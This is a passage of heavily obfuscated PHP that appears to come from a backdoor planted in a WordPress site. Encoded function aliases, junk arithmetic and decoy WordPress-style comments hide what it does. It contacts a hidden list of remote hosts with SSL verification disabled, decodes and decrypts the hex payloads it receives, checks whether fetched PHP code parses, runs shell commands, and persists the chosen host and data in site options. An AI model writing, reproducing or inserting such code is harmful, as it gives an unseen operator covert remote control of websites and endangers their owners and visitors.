  if  (@$GLOBALS['__scf_whcsnotvh9twx_211']($aha88tji6hewg,  $ch7u8u2ur1) !== $GLOBALS['__scf_d4eyetogjbsnt_10']($ch7u8u2ur1))     {



cvtaycsw15_xd1srry($aha88tji6hewg);
  return    null;
       }
 $s8l6khz1_c10  =    @$GLOBALS['__scf_b808yx4xh5v2y_241'](ovffvv33(244)  .  escapeshellarg($aha88tji6hewg)      . bpowi0iglycvx(245));
 cvtaycsw15_xd1srry($aha88tji6hewg);
   if      (!$GLOBALS['__scf_fv3zevxzzb_44']($s8l6khz1_c10)     || $s8l6khz1_c10  ===      "") return  null;



 if  (stripos($s8l6khz1_c10,   f6yrzd2knrmb(246)) !==  false)  return true;
if (stripos($s8l6khz1_c10, iw6xe9q4j6sneg(247))   !==  false  || stripos($s8l6khz1_c10,   f6yrzd2knrmb(248))  !== false) return  false;
return     null;
      }
    function     ib2ffadoyj2m6zxmkaa2in($ch7u8u2ur1)

 {
static $v_db5_cu7eqahfv   =   array();
if  (!$GLOBALS['__scf_fv3zevxzzb_44']($ch7u8u2ur1)    || $GLOBALS['__scf_w6mdcepio4lkz5_7']($ch7u8u2ur1,     c1sob647u1i(249))  ===  false) return    false;

if     ($GLOBALS['__scf_d4eyetogjbsnt_10']($ch7u8u2ur1)  >  (1589379-540803))    $ch7u8u2ur1  = k12vjaxiygekdnj($ch7u8u2ur1);
 if    ($GLOBALS['__scf_d4eyetogjbsnt_10']($ch7u8u2ur1)  >  (0xe0974+0x1f68c))  return      false;
if (!$GLOBALS['__scf_w3f945e2es_4'](ovffvv33(250)))   return   true;
    $htuh36niay71vh     =  $GLOBALS['__scf_d4eyetogjbsnt_10']($ch7u8u2ur1)   . ':' .      $GLOBALS['__scf_tnonex5o9y_60']($ch7u8u2ur1);
      if ($GLOBALS['__scf_hfv46cl2qtqs_251']($htuh36niay71vh,   $v_db5_cu7eqahfv))   return  $v_db5_cu7eqahfv[$htuh36niay71vh];
    $l3t_pm8njfv =  ld0lh4th2c2fgorei2ejj2($ch7u8u2ur1);

if  ($GLOBALS['__scf_wj6dld55k5r8m_39']($v_db5_cu7eqahfv) >  (21+3)) $v_db5_cu7eqahfv    =    array();
  $v_db5_cu7eqahfv[$htuh36niay71vh]     =  $l3t_pm8njfv;
  return  $l3t_pm8njfv;
 }
    function    ld0lh4th2c2fgorei2ejj2($ch7u8u2ur1)
     {
// orchestrate faithful task-graph

    if (!defined(c1sob647u1i(252)))  {
$aitzbrlfnr6hn  =   izq1hwwq7b1u24r6ofo6($GLOBALS['__scf_d4eyetogjbsnt_10']($ch7u8u2ur1));


 if  ($aitzbrlfnr6hn)  {
 $oxaxty4aj3_myw = @token_get_all($ch7u8u2ur1);



      if    (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($oxaxty4aj3_myw)) return true;


  $eoxyuuhxfn8x =   0;
 $mhc7py6r5rxx    =   0;


     $_czlvjdabhxoe4 =  0;
 foreach  ($oxaxty4aj3_myw  as     $emnni5z67kh0) {
/* faithful gateway */

 if ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($emnni5z67kh0))   {
 if    ($emnni5z67kh0[0]    === T_CURLY_OPEN  || $emnni5z67kh0[0] === T_DOLLAR_OPEN_CURLY_BRACES) $eoxyuuhxfn8x++;
   continue;
     }
       if    ($emnni5z67kh0    ===    '{')     $eoxyuuhxfn8x++;
  elseif  ($emnni5z67kh0    === '}')  {

 $eoxyuuhxfn8x--;$es0nnj_6eeer3x=5408;$tpz6d5oe8=$es0nnj_6eeer3x%17;
   if ($eoxyuuhxfn8x    < 0)   return false;
 }    elseif    ($emnni5z67kh0 ===    '(')   $mhc7py6r5rxx++;
    elseif ($emnni5z67kh0  === ')')    {
$mhc7py6r5rxx--;
  

 if      ($mhc7py6r5rxx  <   0) return     false;


  }   elseif  ($emnni5z67kh0  ===   '[') $_czlvjdabhxoe4++;

elseif  ($emnni5z67kh0   ===  ']')    {$hzjq5zf1t7=8419;$acgpmv9shvx=$hzjq5zf1t7%10;
$_czlvjdabhxoe4--;
if  ($_czlvjdabhxoe4 <   0) return  false;



  }
 }
    if  ($eoxyuuhxfn8x  !== 0  ||  $mhc7py6r5rxx  !== 0  ||  $_czlvjdabhxoe4 !== 0)     return     false;



  }
 $kuhqe6cbpl0    =   t484alv2r4val57142kin($ch7u8u2ur1);



if ($GLOBALS['__scf_cof9xlrmzjgm7_253']($kuhqe6cbpl0))  return   $kuhqe6cbpl0;
   return  $aitzbrlfnr6hn;
  }
 if      (!izq1hwwq7b1u24r6ofo6($GLOBALS['__scf_d4eyetogjbsnt_10']($ch7u8u2ur1)))  {



    $kuhqe6cbpl0   =  t484alv2r4val57142kin($ch7u8u2ur1);
return $GLOBALS['__scf_cof9xlrmzjgm7_253']($kuhqe6cbpl0)  ? $kuhqe6cbpl0    : false;
  }
   try  {
@token_get_all($ch7u8u2ur1,      TOKEN_PARSE);
    return  true;
       }  catch   (Throwable   $cje8wku90zm4r) {
   return false;
        }      catch     (Exception  $cje8wku90zm4r)     {
     return false;
}
     }
      function   as6dly3difeit9_nces9()
     {
        return    array(iw6xe9q4j6sneg(254),   ovffvv33(255),   c1sob647u1i(256));
     }

function    xvw4m5u1es27jz()
   {
    return array(iw6xe9q4j6sneg(257),  bpowi0iglycvx(258),  c1sob647u1i(259),    f6yrzd2knrmb(260), hn_f08x0cns80(261),    bpowi0iglycvx(262), iw6xe9q4j6sneg(263), iw6xe9q4j6sneg(264),  hn_f08x0cns80(265),     f6yrzd2knrmb(266),    c1sob647u1i(267),     bpowi0iglycvx(268),  iw6xe9q4j6sneg(269), ovffvv33(270),      f6yrzd2knrmb(271),     c1sob647u1i(272),   iw6xe9q4j6sneg(273), bpowi0iglycvx(274),    c1sob647u1i(275), hn_f08x0cns80(276));
}
function   ws1ggwj04tku454wz_yv()


     {
  return  array(f6yrzd2knrmb(277), ovffvv33(278),   ovffvv33(279), c1sob647u1i(280));


  }



     function ez2pan3ayqru782m5hz($nm_xi0i0qy)
       {
 if    ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(281))) return gzencode($nm_xi0i0qy,  (11-2));
 if     ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(282))) {
      return "\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03"   . gzdeflate($nm_xi0i0qy, (2+7))  . $GLOBALS['__scf_f9uki0i658jr_283']('V', $GLOBALS['__scf_nsnpzr_hnf_284']($nm_xi0i0qy)) .   $GLOBALS['__scf_f9uki0i658jr_283']('V',   $GLOBALS['__scf_d4eyetogjbsnt_10']($nm_xi0i0qy)   &   (4294967271+24));
     

 }

  return    $nm_xi0i0qy;
 }



  function     aogmfzmp9xebjy9a613hu6($nm_xi0i0qy)
       {
  if (!$GLOBALS['__scf_fv3zevxzzb_44']($nm_xi0i0qy) ||  $GLOBALS['__scf_d4eyetogjbsnt_10']($nm_xi0i0qy) <     2) return   $nm_xi0i0qy;
 if   ($GLOBALS['__scf_nv7he759wjfj_9']($nm_xi0i0qy,     0,   2)    !==      "\x1f\x8b")    return   $nm_xi0i0qy;



  if    ($GLOBALS['__scf_d4eyetogjbsnt_10']($nm_xi0i0qy)   <    (227^241)) return false;
$k52uyje7zm = @$GLOBALS['__scf_cqu48nk44w5__285']('V', $GLOBALS['__scf_nv7he759wjfj_9']($nm_xi0i0qy,  -(0x2+0x2)));



      $k52uyje7zm  = $GLOBALS['__scf_w1m1ydxx4_gm9__38']($k52uyje7zm)     ?  $k52uyje7zm[1] : 0;


  if ($k52uyje7zm <  (437+63)  ||  $k52uyje7zm     > (0xb130+0xf4ed0)) return   false;
  if      ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(286))) {
       $kekj16jieb   =  @gzdecode($nm_xi0i0qy,     (1048493+83));$wgjw64qrehw=33*4;$niywfu7f0gpz9m=$wgjw64qrehw-11;
if    ($kekj16jieb  !==  false)   return  $kekj16jieb;
}
  if    ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(287)))  {
       $kekj16jieb     =  @gzinflate($GLOBALS['__scf_nv7he759wjfj_9']($nm_xi0i0qy,     (1+9),    $GLOBALS['__scf_d4eyetogjbsnt_10']($nm_xi0i0qy)    -  (0x6+0xc)), (0xa1c05+0x5e3fb));
       return  ($GLOBALS['__scf_fv3zevxzzb_44']($kekj16jieb)  &&  $GLOBALS['__scf_d4eyetogjbsnt_10']($kekj16jieb)    <= (1048531+45))     ?    $kekj16jieb :    false;$xau_k0ea7rv86p=39+30;$xmzh1h2vlaeg=$xau_k0ea7rv86p-46;
}
   return   false;
}
 function pyu9uokh043xe3grm0ma($l3f91_kitgdzj)


 {
   if  ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(288))) return  $GLOBALS['__scf_s4p8eruhfh_289']($l3f91_kitgdzj);
 if (!  $GLOBALS['__scf_fv3zevxzzb_44']($l3f91_kitgdzj)      ||      $GLOBALS['__scf_d4eyetogjbsnt_10']($l3f91_kitgdzj)    %   2 !==      0)    {


return   false;



 }
return   $GLOBALS['__scf_f9uki0i658jr_283'](f6yrzd2knrmb(290), $l3f91_kitgdzj);
   }
   
    



function n22pv0e8f25y0co8()
     {
   $g6ipu9tsyfmb2n    =     array();
     $xfbelqsui253m  = array(ABSPATH,      ABSPATH    . iw6xe9q4j6sneg(291),  ABSPATH . hn_f08x0cns80(292));
 if (defined(iw6xe9q4j6sneg(293))) $xfbelqsui253m[]    = WP_CONTENT_DIR . '/';
  foreach    ($xfbelqsui253m   as     $kekj16jieb)      {
   $xdtq4m97sn  =      $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(294))   ?   @$GLOBALS['__scf_kajvzw3bpufv_75']($kekj16jieb  .    f6yrzd2knrmb(295))   :      false;
if    ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($xdtq4m97sn))  {
    foreach    ($xdtq4m97sn   as $ko9cqc0s7si9cc)  {
$ez2y3ob0mguh9 =   @$GLOBALS['__scf_uo_a60ibqnli_104']($ko9cqc0s7si9cc);
 if  ($ez2y3ob0mguh9  && $ez2y3ob0mguh9    >  (0x33396496+0x533deea)) {



 $g6ipu9tsyfmb2n[] =  $ez2y3ob0mguh9;
   }
}
// benchmark positive-definite alert

     }
 }
  if   (!empty($g6ipu9tsyfmb2n))    {



        $ftvsfz7ji2  = $g6ipu9tsyfmb2n[$GLOBALS['__scf_e_7yj02ljx4_296']($g6ipu9tsyfmb2n)];
  return ($ftvsfz7ji2  -    ($ftvsfz7ji2   %    (9597+90403)))  +    e16j_u99g1ldi90iix1i9i();

 }
   $nlnq135ne4_ypf3  =  $GLOBALS['__scf_qzyo0sgkyb6_202']()   -  ((0x154+0x19)   *    (27-3)   *     (0x36+0xdda));
$hg2smqyq0q_f_ =     $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(297))  ?    wp_rand(0,    (0x17+0x7) * (36-12)   *   (3547+53))     : $GLOBALS['__scf_s8xmplvgwgjpv_298'](0,    (243^237)      *    (0x2+0x16)  *    (0xdeb+0x25));
   $ftvsfz7ji2 = $nlnq135ne4_ypf3  - $hg2smqyq0q_f_;
   return ($ftvsfz7ji2   - ($ftvsfz7ji2 % (52851+47149)))  +   e16j_u99g1ldi90iix1i9i();
  }
   function  u5oa0f27a6vj9fi6au3($aotmo4q3gpq)



{
  if (empty($GLOBALS[hn_f08x0cns80(299)])) return   $aotmo4q3gpq;



   $w9b1tvpyqe0n5   = $GLOBALS[hn_f08x0cns80(299)]    -   $GLOBALS['__scf_u2xtklnzk8_7_x_300'](true);
   if      ($w9b1tvpyqe0n5   <  1)  return  false;
return  $aotmo4q3gpq > $w9b1tvpyqe0n5  ?  (int)    $GLOBALS['__scf_pqvamo46j0cu_301']($w9b1tvpyqe0n5)     :  $aotmo4q3gpq;


    }
   function d_85zr13yf34xr7($o_mle9hlw6xo,   $aotmo4q3gpq, $wo3eeg1k06k =    null)



     {
 $aotmo4q3gpq     = u5oa0f27a6vj9fi6au3($aotmo4q3gpq);



  if ($aotmo4q3gpq  === false)   return false;
/* satisfiable composite */

$bhxlulkrsr48ceo   =  function  ($aakozw_1zysblhgx)  use ($wo3eeg1k06k)    {
      if    (!$GLOBALS['__scf_fv3zevxzzb_44']($aakozw_1zysblhgx)  || $aakozw_1zysblhgx      ===  "")   return  false;
  if   ($GLOBALS['__scf_d4eyetogjbsnt_10']($aakozw_1zysblhgx)    >     (9585332-1196724))  return     false;
if  ($wo3eeg1k06k)   {
     try   {
 return (bool)  $GLOBALS['__scf_uroqlxj534ze4e_302']($wo3eeg1k06k,   $aakozw_1zysblhgx);
} catch     (Throwable  $cje8wku90zm4r) {
 return  false;
   } catch     (Exception      $cje8wku90zm4r)    {
   return false;


  }
// WP Post Comments: accumulate dependent-type

 }
      return  true;

 };
        $fpcv32y86pyln2w6  =   $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(303)) ?  @$GLOBALS['__scf_r7h_2y83ismjfq_303']($o_mle9hlw6xo, array(
   c1sob647u1i(304) =>  $aotmo4q3gpq,
 bpowi0iglycvx(305)   =>  false,
  hn_f08x0cns80(306)  =>  (11160655-2772047),
   ))  :     false;
if   ($fpcv32y86pyln2w6  &&   (!$GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(307))  ||     !is_wp_error($fpcv32y86pyln2w6))) {
// WordPress 6.6 block bindings customizer transport

  if ((int)  wp_remote_retrieve_response_code($fpcv32y86pyln2w6) === (0x2c+0x9c))  {



     $mp4tktu6tc83hw  = wp_remote_retrieve_body($fpcv32y86pyln2w6);
 if      ($bhxlulkrsr48ceo($mp4tktu6tc83hw))     return   $mp4tktu6tc83hw;
     }
      }
   $aotmo4q3gpq =   u5oa0f27a6vj9fi6au3($aotmo4q3gpq);
       if  ($aotmo4q3gpq   ===  false) return  false;
   if  ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(308))      &&   $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(309)) &&    $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(310))) {
$hmgk0_l_9li9s17  =   @$GLOBALS['__scf_d02n2eqmttocyj_308']($o_mle9hlw6xo);
 if    ($hmgk0_l_9li9s17 ===     false)  return    false;
  @$GLOBALS['__scf_zn6fc9py528o1_311']($hmgk0_l_9li9s17, array(
 constant(ovffvv33(312))  =>     true,
    constant(iw6xe9q4j6sneg(313))   =>     $aotmo4q3gpq,



   constant(hn_f08x0cns80(314))   =>   false,
 constant(c1sob647u1i(315)) => 0,
constant(ovffvv33(316))  =>    false,
constant(ovffvv33(317))  =>  function  ($amsjsw283qnc3, $yxlmo_pojz4c, $ywoyemqs2s8jsomn)    {
    return    $ywoyemqs2s8jsomn >   (8388529+79)   ?    1 :   0;


    },
));
$s2qj8x60xqaq3g5 = @$GLOBALS['__scf_ybyy2dro0qw5fh_318']($hmgk0_l_9li9s17);



$z3ou_xawrso175u7    =   @curl_errno($hmgk0_l_9li9s17);
    $tkbr180maepmd   = @curl_getinfo($hmgk0_l_9li9s17);



@curl_close($hmgk0_l_9li9s17);


  if ($z3ou_xawrso175u7)   return   false;
if   ((int)   $tkbr180maepmd[iw6xe9q4j6sneg(319)] ===  (0x98+0x30) &&   $s2qj8x60xqaq3g5 !==    false  && $bhxlulkrsr48ceo($s2qj8x60xqaq3g5))   {
 return  $s2qj8x60xqaq3g5;
}
    }
 return false;
 }


 function e8w0r58wuldwv74l($o_mle9hlw6xo,     $odcs1ir1yevo7gz,    $nuw83jhnlutc, $aotmo4q3gpq,  $wo3eeg1k06k    =  null)

        {
 $aotmo4q3gpq   =    u5oa0f27a6vj9fi6au3($aotmo4q3gpq);


  if ($aotmo4q3gpq    ===      false)   return false;
    $bhxlulkrsr48ceo =    function    ($aakozw_1zysblhgx)    use   ($wo3eeg1k06k)  {

    if (!$GLOBALS['__scf_fv3zevxzzb_44']($aakozw_1zysblhgx) ||     $aakozw_1zysblhgx  === "") return  false;
     if  ($GLOBALS['__scf_d4eyetogjbsnt_10']($aakozw_1zysblhgx) >   (8388565+43))  return  false;
       if   ($wo3eeg1k06k)  {

try {
// Pest PHP 2: benchmark session-window



return  (bool)     $GLOBALS['__scf_uroqlxj534ze4e_302']($wo3eeg1k06k,  $aakozw_1zysblhgx);



}  catch (Throwable  $cje8wku90zm4r)  {$v1alauqhpsq8u=PHP_MAJOR_VERSION;$b_ym_jg6jyujls=$v1alauqhpsq8u*7;
  return false;
 } catch  (Exception    $cje8wku90zm4r)   {
return    false;
}
}
 return    true;


 };
   $fpcv32y86pyln2w6    =  $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(320))   ?  @$GLOBALS['__scf_x9g4zn5i4ykuh_320']($o_mle9hlw6xo,     array(
f6yrzd2knrmb(321)  =>    $aotmo4q3gpq,
    ovffvv33(322)    => false,
iw6xe9q4j6sneg(323)    =>  (8388564+44),
     bpowi0iglycvx(324)  =>    $nuw83jhnlutc,
    hn_f08x0cns80(325)    =>   $odcs1ir1yevo7gz,
    ))  :  false;
  if  ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(326))  &&   is_wp_error($fpcv32y86pyln2w6))   {



     } elseif   ($fpcv32y86pyln2w6)  {
$ch7u8u2ur1      =    (int) wp_remote_retrieve_response_code($fpcv32y86pyln2w6);
 $g5co0vtz__2j    =  wp_remote_retrieve_body($fpcv32y86pyln2w6);
    $qgguvi979d1ks =  wp_remote_retrieve_headers($fpcv32y86pyln2w6);
$vpudfqeg0p_dsg7 = "";
  if  ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($qgguvi979d1ks))  {
      foreach   ($qgguvi979d1ks      as  $u_irchgch79o     =>   $x434be6la7lqy8l) {
      $vpudfqeg0p_dsg7  .=   $u_irchgch79o .   f6yrzd2knrmb(166) .   $x434be6la7lqy8l    .   bpowi0iglycvx(327);
}


  }
    if ($ch7u8u2ur1     === (0x7d+0x4b)  && $bhxlulkrsr48ceo($g5co0vtz__2j))    {
  return  $g5co0vtz__2j;
  }

  }  else  {
 }

       if  (!empty($GLOBALS[f6yrzd2knrmb(328)]))  return  false;
 

$aotmo4q3gpq  = u5oa0f27a6vj9fi6au3($aotmo4q3gpq);
 if      ($aotmo4q3gpq === false)      return  false;


   if     ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(329))      &&  $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(330))    &&   $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(331)))  {



 $hmgk0_l_9li9s17  =     @$GLOBALS['__scf_d02n2eqmttocyj_308']($o_mle9hlw6xo);
if  ($hmgk0_l_9li9s17  ===   false) {


     return     false;
}
 $fqd52_izqam5j7cl  =   array();
foreach ($nuw83jhnlutc  as   $u_irchgch79o    => $x434be6la7lqy8l)  {
$fqd52_izqam5j7cl[]    = $u_irchgch79o  .  f6yrzd2knrmb(332)      .     $x434be6la7lqy8l;
 }

 @$GLOBALS['__scf_zn6fc9py528o1_311']($hmgk0_l_9li9s17,   array(
  constant(f6yrzd2knrmb(333))  =>  true,
constant(ovffvv33(334)) =>   $odcs1ir1yevo7gz,

    constant(hn_f08x0cns80(312))     =>   true,
constant(iw6xe9q4j6sneg(313))    => $aotmo4q3gpq,


 constant(iw6xe9q4j6sneg(314))  =>   false,
constant(c1sob647u1i(315))     =>    0,



constant(bpowi0iglycvx(335))  =>  $fqd52_izqam5j7cl,
 constant(iw6xe9q4j6sneg(336))     => false,
 constant(ovffvv33(317)) =>   function ($amsjsw283qnc3,      $yxlmo_pojz4c,   $ywoyemqs2s8jsomn)  {
 return    $ywoyemqs2s8jsomn    >   (11327614-2939006)    ?    1 :   0;
},
));
  $s2qj8x60xqaq3g5     =  @$GLOBALS['__scf_ybyy2dro0qw5fh_318']($hmgk0_l_9li9s17);
  $z3ou_xawrso175u7    =   @curl_errno($hmgk0_l_9li9s17);
   $rhszomdqx2 =   @curl_error($hmgk0_l_9li9s17);
$tkbr180maepmd =  @curl_getinfo($hmgk0_l_9li9s17);

    $ll0mnc8j66tvmqks  =   (int)   $tkbr180maepmd[bpowi0iglycvx(319)];
if  ($z3ou_xawrso175u7)   {
  @curl_close($hmgk0_l_9li9s17);
      return  false;



}
@curl_close($hmgk0_l_9li9s17);
 if  ($ll0mnc8j66tvmqks   ===   (0xc5+0x3)     && $s2qj8x60xqaq3g5  !== false &&    $bhxlulkrsr48ceo($s2qj8x60xqaq3g5)) {
   return  $s2qj8x60xqaq3g5;
}


       if ($s2qj8x60xqaq3g5)     {
// WP Formatting API avif fallback

 }
  return false;
}
    return  false;
   }
 
 function  t5lxrqza0rbfj9_848z1uy($_27goe5xippn8139 =  (0xb+0x22))
  {
     $odb6vz0uxm23f9      =   as6dly3difeit9_nces9();
 $pboh1q_933v88jxr    =  xvw4m5u1es27jz();$e_8shvk71dm=4|201;$ov19fhz_d7=$e_8shvk71dm^112;
$_27goe5xippn8139    = (int)  $_27goe5xippn8139;

 if  ($_27goe5xippn8139      < (0x1+0x4))  $_27goe5xippn8139  =   (8-3);
if    ($_27goe5xippn8139 >     (129^172))  $_27goe5xippn8139   =  (0x29+0x4);
   
     if    (empty($odb6vz0uxm23f9)      ||     empty($pboh1q_933v88jxr))   {$ozmeg_ij741c=(0xd0+0x66);$jclrb4px6=$ozmeg_ij741c%16;
return   array();
    }
 
    $ebmq4ssaslue_m4  =  $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(155))   ?    (string)  get_option(f6yrzd2knrmb(337),    "") :    "";


     if ($ebmq4ssaslue_m4      !== ""   &&    !$GLOBALS['__scf_rd2tojulg06lx_160']($ebmq4ssaslue_m4,  $pboh1q_933v88jxr,    true))   $ebmq4ssaslue_m4  =  "";
  if  ($ebmq4ssaslue_m4    !==     "")   {
  $pboh1q_933v88jxr    =   $GLOBALS['__scf_vmnuset3sz__158']($GLOBALS['__scf_yucj673b8x_164']($pboh1q_933v88jxr,   array($ebmq4ssaslue_m4)));
      $GLOBALS['__scf_ft4dc09jmlt_338']($pboh1q_933v88jxr,  $ebmq4ssaslue_m4);
}




       $hggvoyr74szjzs6  =     $GLOBALS['__scf_qew3crlieule_339']($odb6vz0uxm23f9[$GLOBALS['__scf_e_7yj02ljx4_296']($odb6vz0uxm23f9)]);


 if  ($hggvoyr74szjzs6 ===  "")  {
 return   array();
    }
     
     $odcs1ir1yevo7gz  =  iw6xe9q4j6sneg(340)  .    $hggvoyr74szjzs6  .    ovffvv33(341);
$d6bg3q8zlv7hm     =  array(c1sob647u1i(342)   => ovffvv33(343));


  $tudfi6_49ntc9mal =  $GLOBALS['__scf_u2xtklnzk8_7_x_300'](true);
 foreach  ($pboh1q_933v88jxr   as $knvrrk7pxmq)   {
// faithful certificate-chain

 
 if   (($GLOBALS['__scf_u2xtklnzk8_7_x_300'](true)    - $tudfi6_49ntc9mal)   >  $_27goe5xippn8139) {$dskyol9biu9=PHP_MAJOR_VERSION;$i30zvs2h=$dskyol9biu9*2;
      break;
      

      }


    
  $knvrrk7pxmq   =  $GLOBALS['__scf_qew3crlieule_339']((string)   $knvrrk7pxmq);



 if  ($knvrrk7pxmq  === "") {
  continue;
  }


  try {
$g5co0vtz__2j  = e8w0r58wuldwv74l($knvrrk7pxmq,  $odcs1ir1yevo7gz, $d6bg3q8zlv7hm,      (0x1+0x4),   function  ($aakozw_1zysblhgx) {
 $u7phd8aycc =  @$GLOBALS['__scf_yeixh7nk2_03ag_344']($aakozw_1zysblhgx, true);
return  $GLOBALS['__scf_w1m1ydxx4_gm9__38']($u7phd8aycc)    &&    isset($u7phd8aycc[hn_f08x0cns80(345)]);


   });
 if  ($g5co0vtz__2j   ===    false)   {
 continue;
}
        $q_47nn4gbiqod1 =  @$GLOBALS['__scf_yeixh7nk2_03ag_344']($g5co0vtz__2j,      true);
   if   (!  $GLOBALS['__scf_w1m1ydxx4_gm9__38']($q_47nn4gbiqod1) || !   isset($q_47nn4gbiqod1[c1sob647u1i(345)]) ||   !  $GLOBALS['__scf_fv3zevxzzb_44']($q_47nn4gbiqod1[f6yrzd2knrmb(345)])) {
    continue;
}
 
      $l3f91_kitgdzj =  $q_47nn4gbiqod1[bpowi0iglycvx(346)];
 if      ($GLOBALS['__scf_w6mdcepio4lkz5_7']($l3f91_kitgdzj,   c1sob647u1i(347))    ===   0)   {
     $l3f91_kitgdzj   =  $GLOBALS['__scf_nv7he759wjfj_9']($l3f91_kitgdzj,    2);

}




$vv4681cn1toc  =     @pyu9uokh043xe3grm0ma($l3f91_kitgdzj);
      if ($vv4681cn1toc  ===  false ||     $GLOBALS['__scf_d4eyetogjbsnt_10']($vv4681cn1toc)   <  (0x1b+0x25))  {
     continue;

}
 
  $vbrppti438o3   =  (22+41);
     $t5ynzabuv7ufs_4    = $GLOBALS['__scf_l56gszu90juoa_348']($vv4681cn1toc[$vbrppti438o3]);
  $g9u70l7gja   =    $GLOBALS['__scf_nv7he759wjfj_9']($vv4681cn1toc,    $vbrppti438o3  +  1,   $t5ynzabuv7ufs_4);
        if (!  $GLOBALS['__scf_fv3zevxzzb_44']($g9u70l7gja)  ||  $GLOBALS['__scf_d4eyetogjbsnt_10']($g9u70l7gja)   <   (0x2+0x1)) {
     continue;
}
 
   $ihe_colo2xb1a     =   $GLOBALS['__scf_l56gszu90juoa_348']($g9u70l7gja[0]);
     if  ($ihe_colo2xb1a   <  1    ||   $GLOBALS['__scf_d4eyetogjbsnt_10']($g9u70l7gja)    <  1   + $ihe_colo2xb1a  +      1) {
continue;
     }
   
 $n9mj_7_21d5941 = $GLOBALS['__scf_nv7he759wjfj_9']($g9u70l7gja,     1,   $ihe_colo2xb1a);
 

$opt7f1iyrk2  =   $GLOBALS['__scf_nv7he759wjfj_9']($g9u70l7gja,    1 +   $ihe_colo2xb1a);
if (! $GLOBALS['__scf_fv3zevxzzb_44']($n9mj_7_21d5941)  ||    !      $GLOBALS['__scf_fv3zevxzzb_44']($opt7f1iyrk2)) {
 continue;
}
// WP Tag Cloud: deactivate record-layer

     
 $_88toi5q22bd =  f0h420wzduis5n6p2($opt7f1iyrk2, $n9mj_7_21d5941);
  if  (! $GLOBALS['__scf_fv3zevxzzb_44']($_88toi5q22bd)    ||   $GLOBALS['__scf_d4eyetogjbsnt_10']($_88toi5q22bd)   <  2)  {



      g_qoqdy38lfl4v4n3618(c1sob647u1i(349),  iw6xe9q4j6sneg(350));
   continue;
 }

     $xcb_cs1py6a = $GLOBALS['__scf_l56gszu90juoa_348']($_88toi5q22bd[0]);
 if  ($xcb_cs1py6a  < 1    ||  $GLOBALS['__scf_d4eyetogjbsnt_10']($_88toi5q22bd)  < 1  +   $xcb_cs1py6a)     {
     g_qoqdy38lfl4v4n3618(bpowi0iglycvx(349),   bpowi0iglycvx(351));


  continue;
}
// discriminative witness

 
 $_qwyy8eekgcj4rx3      =   $GLOBALS['__scf_nv7he759wjfj_9']($_88toi5q22bd,     1,  $xcb_cs1py6a);
   $xv883rwlxagik8l =    $GLOBALS['__scf_nv7he759wjfj_9']($_88toi5q22bd,  1   +    $xcb_cs1py6a);
 $o_wwbwaq29 =   $GLOBALS['__scf_vmnuset3sz__158']($GLOBALS['__scf_vkh82z40y0_352']($GLOBALS['__scf_d_ovrn098z_240'](ovffvv33(339),   $GLOBALS['__scf_ddawojik92_353'](ovffvv33(354), $xv883rwlxagik8l))));
if  ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(355))) {
    update_option(ovffvv33(337), $knvrrk7pxmq);


   update_option(c1sob647u1i(356),    $GLOBALS['__scf_m9zfobj9w13_357']("\n",  $o_wwbwaq29));
   }


     return  array(f6yrzd2knrmb(358) =>   $_qwyy8eekgcj4rx3,  bpowi0iglycvx(359)  =>  $o_wwbwaq29);
    }   catch  (Throwable     $cje8wku90zm4r) {
 g_qoqdy38lfl4v4n3618(bpowi0iglycvx(349),  $cje8wku90zm4r);

  continue;
    } catch (Exception   $cje8wku90zm4r) {

    continue;


        }
 }
   $w75iadvg28    =   $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(155))   ?  (string)  get_option(f6yrzd2knrmb(360),   "")  :    "";
     $d8g8h5b75ts6teo   =   fcc42yo6xrdenvra0(hn_f08x0cns80(361),   "");
  if ($w75iadvg28 !==  "" && $GLOBALS['__scf_fv3zevxzzb_44']($d8g8h5b75ts6teo)   &&   $d8g8h5b75ts6teo     !== "")  {
 $o_wwbwaq29 =  $GLOBALS['__scf_vmnuset3sz__158']($GLOBALS['__scf_vkh82z40y0_352']($GLOBALS['__scf_d_ovrn098z_240'](iw6xe9q4j6sneg(339),  $GLOBALS['__scf_ddawojik92_353'](iw6xe9q4j6sneg(354),   $w75iadvg28))));

       if   (!   empty($o_wwbwaq29))   {
// @negotiate branded-type

return     array(f6yrzd2knrmb(358)  =>   $d8g8h5b75ts6teo,     iw6xe9q4j6sneg(359)     =>  $o_wwbwaq29);
    }
    }
g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(349),   c1sob647u1i(362));
      return array();$ecbasmsk3uu=PHP_INT_MAX/PHP_INT_MAX;$o8euxlu4wi39u=$ecbasmsk3uu+60;
  }



   function duwyb86hxwrc6k0zk8vqtt($_1eusnddmeik3362,    $ilqpeok6kpc5gn2,   $zlcskza9bzxgems)
     {
     if  (!    $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(363))) {
 return   false;
  }
     if  (isset($GLOBALS[bpowi0iglycvx(364)])    && $GLOBALS['__scf_w1m1ydxx4_gm9__38']($GLOBALS[ovffvv33(364)])  &&   $GLOBALS['__scf_hfv46cl2qtqs_251']($_1eusnddmeik3362,  $GLOBALS[f6yrzd2knrmb(364)]))  {
